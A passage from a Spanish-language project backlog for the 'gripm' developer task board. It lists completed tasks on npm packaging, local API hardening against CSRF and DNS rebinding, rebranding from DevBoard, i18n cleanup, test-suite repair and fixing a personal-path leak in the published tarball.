2. Mover las dependencias esenciales de ejecución a `dependencies` en `package.json` o empaquetar de forma autocontenida.
3. Incorporar un smoke test automatizado en `npm test` que ejecute `npm pack`, extraiga el tarball en un directorio temporal y verifique que `node package/bin/gripm.js --help` ejecute sin errores.

**Criterios de Aceptación:**
- [x] #1 `package.json` incluye en `files` todos los archivos y carpetas requeridos en tiempo de ejecución (`scripts`, `dist`, etc.) o empaqueta un bundle autónomo
- [x] #2 Las dependencias requeridas en tiempo de ejecución por `bin/gripm.js` están correctamente declaradas en `dependencies`
- [x] #3 `bin/gripm.js` no arroja `ERR_MODULE_NOT_FOUND` al ejecutarse desde un tarball empaquetado con `npm pack`
- [x] #4 Implementar script de smoke test (`scripts/test-package-smoke.js`) que empaquete, extraiga y pruebe `--help` del CLI
- [x] #5 Integrar el smoke test en `npm test` para prevenir regresiones en CI y antes de cualquier release
- [x] #6 `npm test`, `npx tsc --noEmit` y `npm run backlog:check` pasan con código 0

---

#### [DEV-148] Seguridad del API Local: Mitigación de CSRF, DNS Rebinding, Validación de Host/Origin y Protección de Browse
- **Prioridad**: `urgent` | **Tipo**: `bug`

Mitigar las vulnerabilidades de seguridad identificadas en la auditoría externa en el API local (`vite.config.ts` / `apiMiddleware`):
1. **CSRF y DNS Rebinding:** Validar estrictamente los encabezados `Host` y `Origin` permitiendo únicamente `localhost`, `127.0.0.1`, `[::1]` o el host explícito configurado.
2. **Métodos Mutantes:** Exigir `Content-Type: application/json` en métodos `POST`, `PUT`, `DELETE` para impedir envíos ciegos tipo "simple request" sin preflight CORS desde sitios de terceros.
3. **CORS Abierto:** Eliminar `Access-Control-Allow-Origin: *` de `/api/events` (SSE) y restringirlo a orígenes locales verificados.
4. **Protección de `/api/fs/browse`:** Validar que el directorio explorado pertenezca a directorios seguros del usuario o restringir navegación arbitraria del sistema de archivos.
5. **Advertencia de Red:** Emitir advertencia de seguridad en la consola si el servidor se enlaza a `--host 0.0.0.0` o a interfaces públicas sin token de acceso.

**Criterios de Aceptación:**
- [x] #1 `apiMiddleware` rechaza peticiones con cabeceras `Origin` no coincidentes con el host local o autorizado
- [x] #2 `apiMiddleware` valida la cabecera `Host` para prevenir ataques de DNS Rebinding
- [x] #3 Peticiones mutantes (`POST`, `PUT`, `DELETE`, `PATCH`) rechazan payloads que no especifiquen `Content-Type: application/json`
- [x] #4 `/api/events` no expone `Access-Control-Allow-Origin: *`
- [x] #5 `/api/fs/browse` implementa salvaguardas y rechaza navegación fuera de límites de usuario permitidos
- [x] #6 Tests automatizados verifican el rechazo de peticiones cross-origin no autorizadas

---

#### [DEV-149] Rebranding Canónico y Erradicación de Deuda Técnica: MCP gripm_*, Directorio .gripm y Variables GRIPM_*
- **Prioridad**: `urgent` | **Tipo**: `tech_debt`

Culminar el rebranding de forma definitiva antes de la publicación del repositorio público `gripm`:
Como el proyecto se lanza como un repositorio nuevo en GitHub (`pablojavierrodriguez/gripm`) con versión 1.0.0 y sin usuarios externos heredados, no existe justificación para arrastrar alias y dualidad de nombres (`devboard_*`, `.devboard/`, `DEVBOARD_*`) que perpetúen una deuda técnica como contrato público.

Esta tarea abarca:
1. **MCP Canónico:** Canonizar las herramientas bajo el prefijo `gripm_*` (`gripm_list_tasks`, `gripm_get_task`, etc.) en `scripts/mcp-server.ts`.
2. **Directorio de Configuración:** Utilizar `.gripm/` como carpeta estándar del proyecto, con soporte de migración transparente o fallback si existe `.devboard/`.
3. **Variables de Entorno:** Estandarizar en `GRIPM_*` (`GRIPM_PORT`, `GRIPM_HOST`, `GRIPM_MODE`), aceptando `DEVBOARD_*` únicamente como fallback suave.
4. **Almacenamiento Global:** Estandarizar en `~/.gripm/` para el registro global de proyectos y caché.
5. **Licencia y Notificaciones:** Actualizar `LICENSE` a "gripm Contributors" y limpiar menciones residuales de DevBoard en cabeceras y guardrails.

**Criterios de Aceptación:**
- [x] #1 `scripts/mcp-server.ts` expone formalmente las herramientas canónicas `gripm_*`
- [x] #2 La aplicación detecta y utiliza `.gripm/config.json` de forma nativa, migrando automáticamente `.devboard/` si existe
- [x] #3 Las variables de entorno canónicas son `GRIPM_PORT`, `GRIPM_HOST`, `GRIPM_MODE`, `GRIPM_HOME`
- [x] #4 El archivo `LICENSE` nombra a "gripm Contributors" en concordancia con `package.json`
- [x] #5 Los guardrails de pre-commit y banners de consola muestran `[gripm Guard]`
- [x] #6 Tests e integración pasan con código 0

---

#### [DEV-150] Subcomando CLI gripm mcp, Tooling Real de Calidad y Optimización de Assets
- **Prioridad**: `high` | **Tipo**: `feature`

Pulido y robustecimiento de ergonomía de adopción y estándares de desarrollo:
1. **Subcomando CLI `gripm mcp`:** En `bin/gripm.js`, si el primer argumento es `mcp`, derivar inmediatamente al servidor MCP (`bin/gripm-mcp.js`), permitiendo la sintaxis documentada en el README `npx gripm mcp`.
2. **Descripciones MCP en Inglés:** Proporcionar descripciones en inglés para las herramientas MCP en `scripts/mcp-server.ts`, asegurando una comprensión óptima por LLMs y agentes de usuarios internacionales.
3. **Tooling Real (ESLint / Prettier / Backlog Check):**
   - Eliminar el bypass silencioso `|| echo '...'` en los scripts de linting y formateo.
   - Instalar dependencias reales de ESLint y Prettier o documentar los comandos correspondientes.
   - Ajustar `backlog:check` para que sea de solo lectura en CI y falle si hay diferencias en lugar de reescribir `BACKLOG.md` silenciosamente.
4. **Optimización de Assets:** Generar favicon SVG o PNG optimizado (~5 KB) en reemplazo del PNG de 462 KB actual.
5. **Higiene de Datos:** Limpiar tareas de prueba en `backlog/archive/` (`dev--028`, `dev--029`, `dev--065`) y sanitizar referencias residuales privadas en scripts y tests.

**Criterios de Aceptación:**
- [x] #1 `node bin/gripm.js mcp` ejecuta el servidor MCP en stdio en lugar de abrir el navegador
- [x] #2 Las herramientas MCP en `scripts/mcp-server.ts` presentan descripciones claras en inglés para agentes IA
- [x] #3 `npm run lint` y `npm run format` cuentan con tooling operativo real o scripts coherentes sin mensajes falsos
- [x] #4 `npm run backlog:check` opera en modo estricto de solo lectura para CI
- [x] #5 Favicon optimizado a tamaño liviano (< 20 KB)
- [x] #6 Limpieza de tareas de prueba en archive y sanitización de cadenas residuales

---

#### [DEV-151] Fuga de Datos Personales en el Tarball de Publicación npm (registry allowlist vs .gitignore)
- **Prioridad**: `critical` | **Tipo**: `bug`

Fuga confirmada de datos personales privados dentro del artefacto que se publica en npm, que impedía lanzar el repositorio público sin exponer información del autor.

`data/projects-registry.json` contiene rutas absolutas del entorno local del autor y el nombre de un repositorio privado. El archivo está correctamente excluido de Git mediante `.gitignore`, **pero se publicaba igual en el tarball de npm**, porque el campo `files` de `package.json` es una *allowlist* que tiene precedencia sobre `.gitignore` e incluía el directorio completo `data`.

Contenido filtrado (3 ocurrencias) :
- `repoPath` de un repositorio de trabajo del autor (ruta absoluta bajo el home del usuario).
- `repoPath` de un proyecto privado referred por nombre (`code/m3`).

**Causa raíz (por qué sobrevivió al saneamiento previo):** DEV-118 AC #4 dio la fuga por resuelta argumentando que el archivo *"ya estaba en `.gitignore` y nunca fue trackeado"*. La verificación se hizo contra el modelo de amenaza equivocado: `.gitignore` protege el repositorio **Git**, pero no tiene efecto sobre el canal de distribución **npm**. La tarea se cerró `done` sin comprobar nunca el tarball real. Los AC #5 a #10 de DEV-118 fueron correctos; el punto ciego fue exactamente la frontera de empaquetado.

**Impacto:** cualquier persona podía ejecutar `npm pack` y obtener las rutas privadas del autor y el nombre de un repo no público, sin necesidad de acceso al repositorio.

**Resolución:** angostar el campo `files` para incluir únicamente el archivo de demostración que sí es necesario en runtime (`data/demo-backlog.json`) en lugar del directorio `data` completo. Se preference esta vía sobre `.npmignore` porque `files` es la allowlist canónica y elimina la ambigüedad de precedencia entre ambos mecanismos, haciendo el resultado determinista e irreversible.

**Criterios de Aceptación:**
- [x] #1 `npm pack --dry-run` no lista `data/projects-registry.json` entre los archivos del tarball
- [x] #2 El campo `files` de `package.json` referencia `data/demo-backlog.json` de forma explícita en lugar del directorio `data`
- [x] #3 `data/demo-backlog.json` sigue presente en el tarball (el proyecto demo functionality no se rompe)
- [x] #4 Verificación de contenido sobre el tarball real extraído: cero coincidencias de `/Users/`, del nombre de usuario del autor, de `Pablo/code` y de los nombres de proyectos privados
- [x] #5 `npm test` pasa, incluido el smoke test de empaquetado que valida la ejecución de `bin/gripm.js` desde el tarball extraído
- [x] #6 `npx tsc --noEmit` sin errores y `npm run backlog:check` en 100% tras el cambio
- [x] #7 Corregir el AC #4 de DEV-118 para que refleje el modelo de amenaza real (npm vs Git) y no.close la tarea con una verificación que solo cubre Git
- [x] #8 Agregar al CI un gate que falle si `npm pack` incluye archivos no permitidos por una allowlist explícita (`npm run publish:check`, verificado con exit 1 al reintroducir la fuga y exit 0 tras el fix)

---

#### [DEV-152] Saneamiento de ESLint Inerte y Erradicacion de Strings i18n Hardcodeados
- **Prioridad**: `high` | **Tipo**: `bug`

Cierre de los dos hallazgos de prioridad alta (P1) detectados en la auditoría pre-lanzamiento open-source (`docs/OPEN_SOURCE_LAUNCH_AUDIT.md` §6.1 y §6.2):

1. **Saneamiento de ESLint Inerte:** `eslint.config.js` existía como un archivo de 17 líneas sin parser de TypeScript ni plugins reales, con sus únicas dos reglas en `off` y sin `eslint` en dependencias. Se elimina el archivo de configuración muerto y se ajustan los ACs de DEV-140 para reflejar con honestidad que la garantía estricta de código la provee `tsc --noEmit` junto con el hook pre-commit y el nuevo guard de publicación.
2. **Erradicación de Strings Hardcodeados en i18n:** Conectar todos los textos y placeholders literales de la interfaz a `t()` en `App.tsx` (navegación móvil 'Tablero', 'Sprint', 'Releases', 'Papelera', toasts), `SprintView.tsx` ('Sin Sprint', diálogos), `ProjectModal.tsx`, `CompleteSprintModal.tsx`, `SprintModal.tsx`, `ReleaseAssembler.tsx`, `ImportWizardModal.tsx`, `PlanGuardModal.tsx` y `FolderPickerModal.tsx`. Garantizar paridad total de claves entre `src/locales/es.json` y `src/locales/en.json`.

**Criterios de Aceptación:**
- [x] #1 Eliminar el archivo inerte `eslint.config.js` y ajustar los criterios de DEV-140
- [x] #2 Conectar la navegación móvil y toasts de `src/App.tsx` a `t()`
- [x] #3 Reemplazar textos y selectores 'Sin Sprint', tooltips y confirmaciones en `src/components/SprintView.tsx` por llamadas a `t()`
- [x] #4 Internacionalizar `src/components/ProjectModal.tsx` incorporando el hook `useTranslation`
- [x] #5 Internacionalizar placeholders y modales de `CompleteSprintModal.tsx`, `SprintModal.tsx`, `ReleaseAssembler.tsx`, `PlanGuardModal.tsx`, `ImportWizardModal.tsx` y `FolderPickerModal.tsx`
- [x] #6 Paridad estricta 1:1 en las claves añadidas en `src/locales/es.json` y `src/locales/en.json`
- [x] #7 `npx tsc --noEmit` con 0 errores y pirámide de verificación en verde (`npm test`, `npm run backlog:check`, `npm run publish:check`)

---

#### [DEV-153] Cobertura Total de i18n y Erradicacion de 37 Strings Literales Restantes
- **Prioridad**: `high` | **Tipo**: `bug`

Cierre definitivo de la internacionalización para resolver el hallazgo P1 §4 de la auditoría (`docs/OPEN_SOURCE_LAUNCH_AUDIT.md`):

1. **Unificación incondicional de pestañas principales:** Pestaña 1 debe ser 'Tablero' (ES) / 'Board' (EN) sin sobreescrituras condicionales por metodología Scrumban, Pestaña 2 'Sprints y Backlog' (ES) / 'Sprints & Backlog' (EN) y Pestaña 3 'Versiones' (ES) / 'Releases' (EN).
2. **Erradicación de los 37 strings literales restantes en componentes:**
   - `SprintView.tsx` (10 strings): 'Iniciar Sprint', 'Completar Sprint', 'Ver Retrospectiva', 'Fecha de registro:', textos fallback de retro, contadores 'ítems'.
   - `ImportWizardModal.tsx` (6 strings): 'Contenido Markdown Plano', 'Subir archivo (.md)', etc.
   - `CompleteSprintModal.tsx` (4 strings): 'Completar {sprint}', 'Completadas', 'Pendientes', 'tareas cerradas con éxito', 'tareas no finalizadas', 'Mover tareas pendientes a:', 'Backlog General', 'Devolver tareas al backlog para repriorizarlas'.
   - `ReleaseAssembler.tsx` (4 strings): 'Fecha de Lanzamiento', 'Fecha Objetivo (Target Date)', 'Estado del Paquete', 'Implementado en Producción', 'En Preparación (Unreleased)', 'Resumen Ejecutivo (Summary)', 'Notas de Alcance / Definición de Hito'.
   - `SprintModal.tsx` (3 strings): 'Nombre del Sprint *', 'Objetivo del Sprint (Sprint Goal)', 'Duración Estimada', presets de semanas, 'Fecha de Inicio', 'Fecha de Fin'.
   - `PlanGuardModal.tsx` (2 strings): 'Plan de Implementación / Criterios de Aceptación', '¿Vas a resolver esto con un Agente IA?'.
   - `ItemCard.tsx`, `KanbanBoard.tsx`, `SettingsView.tsx`: Erradicar los residuos literales identificados.
3. Garantizar paridad 1:1 estricta entre `src/locales/es.json` y `src/locales/en.json`.

**Criterios de Aceptación:**
- [x] #1 Pestaña 1 muestra 'Tablero' en ES y 'Board' en EN de forma incondicional en `Header.tsx` y `App.tsx`
- [x] #2 Reemplazar los 10 textos literales en `src/components/SprintView.tsx` por claves de traducción en `t()`
- [x] #3 Reemplazar textos y etiquetas literales en `src/components/CompleteSprintModal.tsx` por claves de traducción en `t()`
- [x] #4 Reemplazar textos y etiquetas literales en `src/components/ReleaseAssembler.tsx` por claves de traducción en `t()`
- [x] #5 Reemplazar textos y etiquetas literales en `src/components/SprintModal.tsx`, `ImportWizardModal.tsx` y `PlanGuardModal.tsx`
- [x] #6 Reemplazar textos y etiquetas literales restantes en `ItemCard.tsx`, `KanbanBoard.tsx` y `SettingsView.tsx`
- [x] #7 Paridad 1:1 estricta verificada entre `src/locales/es.json` y `src/locales/en.json` (0 claves faltantes en ambos)
- [x] #8 Pirámide de verificación en verde (`tsc`, `npm test`, `npm run backlog:check`, `npm run publish:check`)

---

#### [DEV-154] Reparacion y Conexion de Suite de Verificacion Huerfana a npm test
- **Prioridad**: `high` | **Tipo**: `bug`

Resolución del hallazgo P1 §3 de la auditoría (`docs/OPEN_SOURCE_LAUNCH_AUDIT.md`):

Existen 5 scripts de verificación en `scripts/` creados en tareas históricas que no están conectados a `npm test` y que fallan con exit code 127 o errores de importación al ser invocados:
1. `scripts/verify-optimistic-locking.js` (DEV-017): Prueba crítica de integridad de datos para control de concurrencia y prevención de sobrescrituras accidentales. Falla buscando el plugin Vite con un shape antiguo.
2. `scripts/verify-sse.js` (DEV-014): Prueba de eventos server-sent y watcher en tiempo real. Falla por resolución de plugin.
3. `scripts/verify-legacy-import.js`: Prueba de importación de backlogs Markdown antiguos. Falla por resolución de plugin.
4. `scripts/verify-mcp-binary.js`: Prueba del catálogo de tools del servidor MCP. Falla porque busca `devboard_sync_backlog` en lugar del nombre canónico post-rebranding `gripm_sync_backlog`.
5. `scripts/verify-resilience-and-cli.js`: Falla intentando ejecutar `npm run tasks` (comando inexistente).

Se deben reparar o refactorizar estos scripts para que funcionen con la arquitectura actual del backend/Vite y cablearlos formalmente dentro de `npm test` para que corran en CI y localmente en cada validación.

**Criterios de Aceptación:**
- [x] #1 `scripts/verify-optimistic-locking.js` reparado y validando exitosamente el control de concurrencia con código 0
- [x] #2 `scripts/verify-sse.js` reparado y validando eventos SSE con código 0
- [x] #3 `scripts/verify-legacy-import.js` reparado y validando importación legacy con código 0
- [x] #4 `scripts/verify-mcp-binary.js` actualizado para comprobar las 12 tools con prefijo `gripm_*` con código 0
- [x] #5 `scripts/verify-resilience-and-cli.js` adaptado a los scripts reales del CLI o depurado limpiamente
- [x] #6 `npm test` ejecuta todos los scripts de verificación activos de forma secuencial y finaliza con código 0
- [x] #7 `npm run publish:check` se ejecuta en CI y valida la limpieza total del paquete

---

#### [DEV-155] Saneamiento de Artefactos de Distribucion Shims de Binarios DTS Obsoletos y Residuos de Marca
- **Prioridad**: `medium` | **Tipo**: `chore`

Resolución de los hallazgos de empaquetado e higiene reportados en la auditoría (`docs/OPEN_SOURCE_LAUNCH_AUDIT.md` §5.1, §5.3, §5.4, §5.5, §5.8, §5.10):

1. **Renombrado/Alias de Skill de Agentes:** `.agents/skills/devboard/` todavía contiene la denominación previa a rebranding y es instalada en repositorios externos durante `--init`. Se debe migrar a `.agents/skills/gripm/` manteniendo alias retrocompatible si fuera necesario.
2. **Shims en Binarios Duplicados:** `bin/devboard.js` y `bin/devboard-mcp.js` son duplicados exactos (~195 KB) de `bin/gripm.js` y `bin/gripm-mcp.js`. Deben convertirse en wrappers ligeros de 3 líneas que importen el binario canónico correspondiente.
3. **Eliminación de `.d.ts` Obsoletos:** Eliminar los 6 archivos `.d.ts` en `scripts/` (`import-docs.d.ts`, `initScaffold.d.ts`, `portUtils.d.ts`, `registryConfig.d.ts`, `uninstall.d.ts`, `updateChecker.d.ts`) y agregarlos a `.gitignore` dado que `tsconfig` opera con `"noEmit": true`.
4. **Deriva de Versión:** Corregir el fallback `let appVersion = '0.5.0'` en `vite.config.ts:31` para que coincida con `1.0.0` y actualizar targets hardcodeados en `scripts/import-docs.js`.
5. **Residuo de Marca en Demo Backlog:** Actualizar `data/demo-backlog.json` para reemplazar menciones residuales de "DevBoard" por "gripm".
6. **Configuración local `.gripm/config.json`:** Sanear opciones personales commiteadas y unificar subtítulos de columnas.

**Criterios de Aceptación:**
- [x] #1 Renombrar `.agents/skills/devboard/` a `.agents/skills/gripm/` y actualizar el asistente `--init` para instalar `gripm`
- [x] #2 `bin/devboard.js` y `bin/devboard-mcp.js` convertidos en shims ligeros que reexportan/importan `bin/gripm.js` y `bin/gripm-mcp.js`
- [x] #3 6 archivos `.d.ts` en `scripts/` eliminados del árbol de trabajo y `*.d.ts` ignorado en `.gitignore`
- [x] #4 Fallback de `appVersion` en `vite.config.ts` actualizado a `1.0.0` y `scripts/import-docs.js` actualizado
- [x] #5 `data/demo-backlog.json` libre de menciones a DevBoard
- [x] #6 `.gripm/config.json` saneado y estandarizado
- [x] #7 `npm run publish:check` y `npm test` finalizan con código 0

---

#### [DEV-157] Integracion de Logo y Splash en Pantalla de Carga y Unificacion de Favicon
- **Prioridad**: `high` | **Tipo**: `feature`

La aplicación presenta dos inconsistencias visuales y de branding:
1. El favicon vectorial `public/favicon.svg` conserva un isotipo de dos barras horizontales heredado del prototipo anterior a gripm, que los navegadores modernos priorizan sobre `public/favicon.png`.
2. La carga inicial de la aplicación muestra una pantalla en blanco antes de montar React (`<div id="root"></div>` vacío en `index.html`), y una vez montado React, se muestra un spinner genérico circular sin el logo ni la identidad de gripm en `src/App.tsx`.

Esta tarea unifica la identidad visual en todos los puntos de entrada:
- Actualización de `public/favicon.svg` y configuración de meta tags en `index.html` para mostrar la "G" oficial de gripm.
- Splash screen instantáneo (0ms) en `index.html` con CSS inline ligero y anti-flash.
- Pantalla de carga en `src/App.tsx` con el isotipo de gripm, halo/anillo orbital y estado tipográfico sobrio.

**Criterios de Aceptación:**
- [x] #1 Unificar favicon en public/favicon.svg reflejando el logo oficial 'G' de gripm y actualizar meta tags en index.html
- [x] #2 Incorporar splash screen instantaneo (0ms) en index.html dentro de #root con logo centrado, soporte anti-flash y cero CLS
- [x] #3 Implementar pantalla de carga estilizada en App.tsx con logo oficial de gripm, animacion orbital/halo y mensaje de estado
- [x] #4 Superar la piramide de verificacion (tsc, npm test, backlog:check, build) sin interferir con cambios de otros agentes

---

#### [DEV-158] Sincronizador Universal del Agentic Team Playbook y Documentacion de Arquitectura de Skills
- **Prioridad**: `medium` | **Tipo**: `feature`

Incorporar soporte de primera clase en gripm para sincronizar y operacionalizar el Agentic Team Playbook preservando las configuraciones del proyecto:
1. **Script de sincronización universal (`scripts/sync-playbook.mjs`):** Descarga e instala las skills canónicas y directivas desde upstream (`pablojavierrodriguez/agentic-team-playbook`), bajo el principio de separación de capas (Framework vs Proyecto), garantizando que `AGENTS.md` y `backlog/` nunca se sobreescriban.
2. **Subcomando CLI `gripm playbook sync`:** Añadido en `bin/gripm.js` y `bin/devboard.js` para que cualquier repositorio (sea Node, Python, Go, Rust, etc.) pueda ejecutar `npx gripm playbook sync`.
3. **Script de conveniencia en `package.json`:** `"playbook:sync": "node scripts/sync-playbook.mjs"`.
4. **Documentación de arquitectura ("Under the Hood"):** Actualización de `docs/AGENTIC_PLAYBOOK.md` explicando por qué los agentes son skills modulares con *role-swapping* y *progressive disclosure* en lugar de enjambres asíncronos (swarms), agregando matriz comparativa y guía de sincronización de capas.
5. **Tip Pro en READMEs:** Actualización de `README.md` y `README.es.md` con el comando universal de sincronización.

**Criterios de Aceptación:**
- [x] #1 Script `scripts/sync-playbook.mjs` implementado con manejo defensivo de red y preservación estricta de `AGENTS.md`
- [x] #2 Subcomando `gripm playbook sync` operativo y documentado en `--help` de los binarios CLI
- [x] #3 Script `playbook:sync` agregado en `package.json`
- [x] #4 `docs/AGENTIC_PLAYBOOK.md` actualizado con sección de arquitectura de skills vs swarms y separación de capas
- [x] #5 Referencias y pro tips agregados en `README.md` y `README.es.md`
- [x] #6 Pirámide de verificación validada (`tsc`, `npm test`, `npm run backlog:check`, `npm run build`) con código de salida 0

---

#### [DEV-159] Validacion Condicional en Pre-Commit Hook por Archivos de Backlog en el Indice de Git
- **Prioridad**: `medium` | **Tipo**: `feature`

Implementación de validación condicional en el hook pre-commit (scripts/verify-backlog-sync.js --hook y .githooks/pre-commit). El hook solo ejecuta la verificación de coherencia si el índice de Git (git diff --cached --name-only) contiene archivos de backlog (BACKLOG.md o tareas en backlog/tasks/). Si el commit no toca el backlog, se omite con código 0 preservando commits atómicos. Si toca el backlog, valida coherencia e impide tareas fantasma o desfase sin mutar el índice.

**Criterios de Aceptación:**
- [x] #1 scripts/verify-backlog-sync.js --hook inspecciona git diff --cached --name-only para detectar archivos de backlog stageados
- [x] #2 Si no hay archivos de backlog stageados en el commit, el hook omite la validación y retorna código 0 permitiendo commits de solo código o documentación
- [x] #3 Si hay tareas stageadas en backlog/tasks/, verifica que BACKLOG.md también esté stageado y sincronizado con las mismas
- [x] #4 Si BACKLOG.md está stageado, verifica que ninguna tarea referenciada sea un archivo fantasma inexistente en Git o en el commit
- [x] #5 El hook opera de forma estrictamente no invasiva sin mutar el índice ni ejecutar git add automático
- [x] #6 Pirámide de verificación en verde (tsc, npm test, backlog:check, publish:check, build) con código 0

---

#### [DEV-160] Soporte de Primera Clase para Estado Ideas y Aislamiento de Test MCP en Sincronizacion de Backlog
- **Prioridad**: `urgent` | **Tipo**: `bug`

Esta tarea aborda dos anomalías críticas reportadas en el cierre de Sprint 8:

1. **Error al marcar ítems como "ideas":**
   - En `scripts/backlogMdParser.ts`, la función `formatStatusForMd` degradaba silenciosamente `ideas` a `draft`, violando la regla de AGENTS.md §6.6 (*"Estado ideas de primera clase: NUNCA normalizar o degradar ideas a draft en parsers o vistas"*).
   - En `scripts/mcp-server.ts`, los esquemas JSON-RPC de las herramientas de mutación (`gripm_update_task`, `devboard_update_task`, `gripm_create_task`, `gripm_bulk_update_tasks`) omitían `'ideas'` de su lista de valores permitidos (`enum`), provocando errores de validación de esquema en clientes y agentes MCP.
   - En `src/components/SprintView.tsx`, el selector de estado en la tabla carecía de la opción `<option value="ideas">`.

2. **Mutación del árbol de trabajo en `npm test` (Hallazgo §13.5 del Auditor):**
   - El script `scripts/verify-mcp-binary.js` ejecutaba la tool mutante `gripm_sync_backlog` directamente sobre el repositorio activo.
   - Dicha herramienta inyectaba `targetSprint` en `milestone`, violando la ortogonalidad y generando un `BACKLOG.md` desfasado respecto al comando canónico `npm run backlog:sync`.
   - Se debe desacoplar sprint de milestone y garantizar que `npm test` deje el árbol de trabajo completamente limpio.

**Criterios de Aceptación:**
- [x] #1 Corregir formatStatusForMd en scripts/backlogMdParser.ts para preservar 'ideas' como estado canonico de primera clase
- [x] #2 Incorporar 'ideas' en los enums de esquema de mutacion de scripts/mcp-server.ts (update, create y bulk_update)
- [x] #3 Actualizar SprintView.tsx y KanbanBoard.tsx para soportar y seleccionar 'ideas' sin degradaciones visuales
- [x] #4 Eliminar la inyeccion de sprint en milestone en scripts/mcp-server.ts para alinear gripm_sync_backlog con el CLI export
- [x] #5 Preservar el estado limpio de BACKLOG.md en scripts/verify-mcp-binary.js para que npm test no ensucie el arbol de trabajo
- [x] #6 Recompilar binarios con build-binaries.js y validar suite completa (tsc, npm test, backlog:check) en verde

---

#### [DEV-161] Corte Limpio de Identidad: Eliminar Alias de Marca Previos al Rebranding (gripm)
- **Prioridad**: `high` | **Tipo**: `chore`

Eliminar la superficie de compatibilidad hacia atrás de los nombres previos al rebranding (`devboard`, `dev-board`), **conservando la compatibilidad de lectura** de datos legacy.

### Contexto: por qué ahora

El rebranding de DevBoard a gripm construyó alias retrocompatibles bajo el supuesto de que existirían usuarios heredados que migrar. Ese supuesto **no se sostiene para el lanzamiento público**: el repositorio público es un proyecto nuevo, sin usuarios externos, y el único conjunto de consumidores real son los proyectos del propio autor.

Un alias público no es código descartable: es un **contrato que ya no puede quitarse** sin romper a alguien, y que obliga a documentarlo en cada README, CONTRIBUTING, issue y respuesta de soporte. Mantenerlo sin usuarios que migren es deuda pura.

Este es el mismo análisis que ya quedó registrado en `BACKLOG.md:3117` al decidir la bifurcación de repositorio, y que nunca se ejecutó sobre el código.

### Qué se elimina (identidad instalada - lo que el usuario ve y escribe)

1. **Entradas `bin` redundantes en `package.json`.** Hoy hay seis: `gripm`, `gripm-mcp`, `devboard`, `devboard-mcp`, `dev-board`, `dev-board-mcp`. Solo deben sobrevivir las dos canónicas.
2. **Alias de herramientas MCP.** `scripts/mcp-server.ts:442` normaliza `devboard_*` → `gripm_*` en la entrada. Eliminar esa línea.
3. **Skill duplicado `.agents/skills/devboard/`.** `--init` instala hoy dos directorios de skills: el canónico `gripm/` y un alias `devboard/`. Es el **único punto donde la marca vieja se propaga activamente** al repositorio del consumidor.
4. **Shims de binarios `bin/devboard.js` y `bin/devboard-mcp.js`**, y su generación en `scripts/build-binaries.js`.
5. **Fallbacks `devboard 2>/dev/null ||` en los scripts scaffoldeados** por `scripts/initScaffold.js`.
6. **Menciones del nombre anterior en documentación** (README, README.es, CONTRIBUTING, AGENTS, docs, templates de skills), reemplazadas por el nombre canónico o por formulación neutra.

### Qué se conserva (compatibilidad de lectura - invisible y protectora)

**No tocar** las lecturas de rutas legacy. Son costo cero (el nombre no se muestra al usuario) y valor real: Protegen los proyectos locales del autor que aún tengan datos en directorios anteriores.

- `vite.config.ts`: resolución de `.devboard/config.json` y `.devboard/backlog.json` (líneas ~140, ~220, ~231, ~255, ~1113, ~1892).
- Migración automática `.devboard/config.json` → `.gripm/config.json` en `vite.config.ts`.
- Detección de `.devboard/` como repo con backlog al inicializar.

> [!NOTE]
> La distinción es: **eliminamos la marca vieja como identidad pública y la conservamos como formato de lectura.** Quien tenga datos legacy los conserva; quien instale el producto solo conoce `gripm`.

### Caso particular: el alias MCP

Merece justificación propia porque es el más costoso y el menos útil.

- **No se anuncia.** `tools/list` expone únicamente las 12 herramientas `gripm_*`. Ningún agente puede descubrir que el alias existe.
- **Pero sí funciona.** `scripts/verify-mcp-binary.js` lo valida explícitamente (`✅ [6/6] Alias retrocompatible devboard_get_stats OK`).

Es decir: código que se mantiene y tests que lo cubren, a cambio de **cero beneficio descubrible**. Y si se anunciara, el costo sería peor: el catálogo pasaría de **12 a 24 herramientas**, duplicando el contexto de schemas que cada agente LLM carga en cada sesión - exactamente lo contrario del objetivo de eficiencia con agentes que declara el producto.

### Impacto esperado

- Bundle de binarios distribuido: se eliminan dos shims redundantes.
- Superficie pública de nombres: de 6 bins a 2.
- `.agents/skills/` instalado por `--init`: de 2 directorios a 1.
- Sin impacto funcional: no hay usuarios externos que migren.

**Criterios de Aceptación:**
- [x] #1 `node -e "console.log(Object.keys(require('./package.json').bin).join(' '))"` devuelve exactamente `gripm gripm-mcp` (verificación: el comando debe imprimir solo esos dos, sin `devboard`, `devboard-mcp`, `dev-board` ni `dev-board-mcp`)
- [x] #2 `ls bin/` NO lista `devboard.js` ni `devboard-mcp.js`, y `scripts/build-binaries.js` ya no los genera
- [x] #3 `grep -n "replace(/^devboard_" scripts/mcp-server.ts` no devuelve ninguna coincidencia (el alias de normalización fue eliminado)
- [x] #4 `grep -c "name: 'devboard_" scripts/mcp-server.ts` devuelve `0`, y `grep -c "name: 'gripm_" scripts/mcp-server.ts` devuelve `12` (el catálogo canónico queda intacto)
- [x] #5 `scripts/verify-mcp-binary.js` actualizado para dejar de validar el alias `devboard_*` y sigue validando en verde las 12 herramientas `gripm_*`
- [x] #6 `scripts/initScaffold.js` instala **solo** `.agents/skills/gripm/` en el repositorio destino; el directorio `.agents/skills/devboard/` del paquete fue eliminado y su lectura como fallback removida del código
- [x] #7 `grep -rn "devboard 2>/dev/null" scripts/initScaffold.js` devuelve `0` (sin fallbacks de nombre antiguo en los scripts scaffoldeados)
- [x] #8 Las rutas legacy de **lectura** siguen intactas: `grep -c "\.devboard" vite.config.ts` devuelve un valor `>= 6` (verificación negativa explícita: NO se deben borrar las resoluciones de `.devboard/config.json` ni `.devboard/backlog.json`)
- [x] #9 `npm run backlog:sync` tras la tarea y `npm run backlog:check` en verde
- [x] #10 `npx tsc --noEmit` con 0 errores
- [x] #11 `npm test` con exit 0 (suite completa de 9 scripts)
- [x] #12 `npm run publish:check` en verde
- [x] #13 `npm run build` sin errores y `node bin/gripm.js --help` ejecutable desde el tarball
- [x] #14 `grep -rniE "devboard|dev-board" README.md README.es.md CONTRIBUTING.md AGENTS.md docs/*.md .github/` devuelve únicamente coincidencias justificadas por la compatibilidad de lectura o por historia de releases, sin alias prescriptivos en la documentación de usuario

---

#### [DEV-162] Consolidación de Fuente Única de Estados useStatusMeta y Erradicación de Mapas Hardcodeados
- **Prioridad**: `high` | **Tipo**: `refactor`

